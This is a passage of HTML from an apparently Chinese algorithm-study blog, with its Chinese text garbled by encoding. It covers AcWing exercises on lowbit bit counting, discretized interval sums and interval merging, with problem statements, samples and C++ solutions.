class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„ä¸ªæ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><mtext>æ•°åˆ—ä¸­å…ƒç´ çš„å€¼</mtext><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">0 \le æ•°åˆ—ä¸­å…ƒç´ çš„å€¼ \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">æ•°åˆ—ä¸­å…ƒç´ çš„å€¼</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>51 2 3 4 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>1 1 2 1 2</code></pre><h3 id="lowbit-x-x-x">lowbit(x) = x &amp; -x</h3><p>é¢˜å‹: lowbit(x)è¿”å›xçš„æœ€åä¸€ä½1, æ¯”å¦‚lowbit(20)=lowbit(10100_2)=100<br>æ–¹æ³•: <code>x &amp; -x</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">      x -= x &amp; -x;</span><br><span class="line">      res++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, res);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç¦»æ•£åŒ–">ç¦»æ•£åŒ–</h1><h2 id="AcWing-802-åŒºé—´å’Œ"><a href="https://www.acwing.com/problem/content/804/">AcWing 802. åŒºé—´å’Œ</a></h2><p>å‡å®šæœ‰ä¸€ä¸ªæ— é™é•¿çš„æ•°è½´ï¼Œæ•°è½´ä¸Šæ¯ä¸ªåæ ‡ä¸Šçš„æ•°éƒ½æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ã€‚</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬é¦–å…ˆè¿›è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> æ¬¡æ“ä½œï¼Œæ¯æ¬¡æ“ä½œå°†æŸä¸€ä½ç½® <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> ä¸Šçš„æ•°åŠ  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œè¿›è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> æ¬¡è¯¢é—®ï¼Œæ¯ä¸ªè¯¢é—®åŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>ï¼Œä½ éœ€è¦æ±‚å‡ºåœ¨åŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>l</mi><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[l, r]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">]</span></span></span></span> ä¹‹é—´çš„æ‰€æœ‰æ•°çš„å’Œã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>ã€‚</p><p>å†æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…± <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡Œï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªè¯¢é—®ä¸­æ‰€æ±‚çš„åŒºé—´å†…æ•°å­—å’Œã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><mi>x</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le x \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n,m \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><mi>l</mi><mo>â‰¤</mo><mi>r</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le l \le r \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>10000</mn><mo>â‰¤</mo><mi>c</mi><mo>â‰¤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">-10000 \le c \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">10000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>3 31 23 67 51 34 67 8</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>805</code></pre><h3 id="ç¦»æ•£åŒ–-2">ç¦»æ•£åŒ–</h3><blockquote><p><strong>æ’åº &amp; å»é‡</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());</span><br><span class="line">alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">3e5</span> + <span class="number">10</span>;  <span class="comment">// 3e5</span></span><br><span class="line"><span class="type">int</span> a[kN], s[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;alls, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> l = <span class="number">0</span>, r = alls.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">    <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (alls[mid] &gt;= x) &#123;</span><br><span class="line">      r = mid;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> l + <span class="number">1</span>;  <span class="comment">// ç¦»æ•£åŒ–åˆ°[1, alls.size()], æ–¹ä¾¿æ±‚å‰ç¼€å’Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; alls;</span><br><span class="line">  vector&lt;PII&gt; add, query;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;x, &amp;c);</span><br><span class="line">    alls.<span class="built_in">push_back</span>(x);</span><br><span class="line">    add.<span class="built_in">push_back</span>(&#123;x, c&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">    alls.<span class="built_in">push_back</span>(l);</span><br><span class="line">    alls.<span class="built_in">push_back</span>(r);</span><br><span class="line">    query.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());</span><br><span class="line">  alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x: add) &#123;</span><br><span class="line">    <span class="keyword">auto</span> index = <span class="built_in">find</span>(alls, x.first);</span><br><span class="line">    a[index] += x.second;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= alls.<span class="built_in">size</span>(); i++) s[i] = s[i - <span class="number">1</span>] + a[i];  <span class="comment">// alls.size(), è€Œén</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x: query) &#123;</span><br><span class="line">    <span class="keyword">auto</span> l = <span class="built_in">find</span>(alls, x.first), r = <span class="built_in">find</span>(alls, x.second);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[r] - s[l - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åŒºé—´åˆå¹¶">åŒºé—´åˆå¹¶</h1><h2 id="AcWing-803-åŒºé—´åˆå¹¶"><a href="https://www.acwing.com/problem/content/805/">AcWing 803. åŒºé—´åˆå¹¶</a></h2><p>ç»™å®š <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªåŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>l</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[l_i, r_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>ï¼Œè¦æ±‚åˆå¹¶æ‰€æœ‰æœ‰äº¤é›†çš„åŒºé—´ã€‚</p><p>æ³¨æ„å¦‚æœåœ¨ç«¯ç‚¹å¤„ç›¸äº¤ï¼Œä¹Ÿç®—æœ‰äº¤é›†ã€‚</p><p>è¾“å‡ºåˆå¹¶å®Œæˆåçš„åŒºé—´ä¸ªæ•°ã€‚</p><p>ä¾‹å¦‚ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mclose">]</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[2,6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mclose">]</span></span></span></span> å¯ä»¥åˆå¹¶ä¸ºä¸€ä¸ªåŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span 